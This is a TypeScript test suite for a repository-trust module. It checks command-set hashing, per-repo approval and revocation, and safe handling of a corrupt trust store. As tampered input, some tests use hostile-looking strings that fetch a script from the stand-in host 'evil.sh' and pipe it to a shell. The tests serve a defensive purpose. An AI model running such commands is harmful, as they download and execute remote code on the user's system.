import { afterAll, beforeEach, describe, expect, test } from 'bun:test'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  approveRepo,
  commandSetHash,
  isRepoTrusted,
  readTrustStore,
  revokeRepo,
  writeTrustStore,
  type TrustStore,
} from './repo-trust'

// Never the real ~/.config/TerMinal.
const dir = mkdtempSync(join(tmpdir(), 'gt-repo-trust-'))
const file = join(dir, 'repo-trust.json')
afterAll(() => rmSync(dir, { recursive: true, force: true }))
beforeEach(() => rmSync(file, { force: true }))

describe('commandSetHash', () => {
  test('is order-independent — a reordered widgets.json is not a new decision', () => {
    expect(commandSetHash(['a', 'b'])).toBe(commandSetHash(['b', 'a']))
    expect(commandSetHash(['a', 'b', 'a'])).toBe(commandSetHash(['a', 'b']))
  })

  test('changing a single character invalidates the fingerprint', () => {
    expect(commandSetHash(['git status'])).not.toBe(commandSetHash(['git status '])) // trailing space
    expect(commandSetHash(['echo hi'])).not.toBe(commandSetHash(['echo hi; curl evil.sh | sh']))
  })

  // Joining with ANY separator is ambiguous, because any separator can also
  // occur inside a command — a space obviously, and even NUL is expressible in
  // JSON as \u0000. A collision here means one approved command set silently
  // authorises a different one.
  test('does not collide across different splits of the same text', () => {
    expect(commandSetHash(['a b', 'c'])).not.toBe(commandSetHash(['a', 'b c']))
    expect(commandSetHash(['a\u0000b'])).not.toBe(commandSetHash(['a', 'b']))
    expect(commandSetHash(['a"b'])).not.toBe(commandSetHash(['a', 'b']))
    expect(commandSetHash(['["a","b"]'])).not.toBe(commandSetHash(['a', 'b']))
  })
})

describe('isRepoTrusted', () => {
  const hash = commandSetHash(['npm run x'])

  test('an unknown repo is untrusted', () => {
    expect(isRepoTrusted({}, '/tmp/repo', hash)).toBe(false)
  })

  test('approval is keyed on the exact command set — editing it re-prompts', () => {
    const store = approveRepo({}, '/tmp/repo', hash)
    expect(isRepoTrusted(store, '/tmp/repo', hash)).toBe(true)
    expect(isRepoTrusted(store, '/tmp/repo', commandSetHash(['npm run x', 'curl evil.sh']))).toBe(
      false,
    )
  })

  test('approval does not leak to a different repo root', () => {
    const store = approveRepo({}, '/tmp/repo', hash)
    expect(isRepoTrusted(store, '/tmp/other', hash)).toBe(false)
    expect(isRepoTrusted(store, '', hash)).toBe(false)
  })

  test('a repo with no repo-sourced commands needs no approval', () => {
    expect(isRepoTrusted({}, '/tmp/repo', commandSetHash([]))).toBe(true)
  })

  test('revoke removes the approval', () => {
    const store = revokeRepo(approveRepo({}, '/tmp/repo', hash), '/tmp/repo')
    expect(isRepoTrusted(store, '/tmp/repo', hash)).toBe(false)
  })
})

describe('trust store IO', () => {
  test('round-trips through disk', () => {
    const store = approveRepo({}, '/tmp/repo', 'abc123', 1700)
    writeTrustStore(store, file)
    expect(readTrustStore(file)).toEqual({ '/tmp/repo': { hash: 'abc123', approvedAt: 1700 } })
  })

  test('a missing or corrupt store is empty — never accidentally trusting', () => {
    expect(readTrustStore(join(dir, 'nope.json'))).toEqual({})
    writeFileSync(file, '{ not json')
    expect(readTrustStore(file)).toEqual({})
    writeFileSync(file, '["array"]')
    expect(readTrustStore(file)).toEqual({})
  })

  test('entries without a string hash are dropped rather than trusted', () => {
    writeFileSync(file, JSON.stringify({ '/a': { approvedAt: 1 }, '/b': { hash: 'h' } }))
    const store: TrustStore = readTrustStore(file)
    expect(Object.keys(store)).toEqual(['/b'])
  })
})
